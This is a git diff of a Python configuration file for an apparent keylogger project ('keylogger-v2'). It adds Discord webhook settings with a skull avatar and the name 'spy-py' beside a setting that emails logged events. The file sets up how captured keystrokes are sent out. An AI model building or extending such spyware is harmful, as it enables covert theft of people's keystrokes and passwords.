@@ -1,12 +1,18 @@
 import os
 import tempfile
 
+
 # Common Configuration
 LOGS_DIRECTORY = "/Users/mohamedkhettab/Desktop/Coding/Python/keylogger-v2/src"  # Path to wherever you want the logs directory to be
 if not LOGS_DIRECTORY:
     LOGS_DIRECTORY = os.path.join(tempfile.gettempdir(), "logs")
 else:
     LOGS_DIRECTORY = os.path.join(LOGS_DIRECTORY, "logs")
+
+# Webhook Configuration
+WEBHOOK_URL = "" # URL To your discord webhook
+WEBHOOK_AVATAR_URL = "https://upload.wikimedia.org/wikipedia/commons/thumb/0/06/Skull_and_Crossbones.svg/510px-Skull_and_Crossbones.svg.png?20190922182140" # URL to your webhook's avatar
+WEBHOOK_USERNAME = "spy-py" # What you want the webhook username to be
 
 # Input Configuration
 LOGS_PER_EMAIL = 10000  # Number of logged events before sending the data
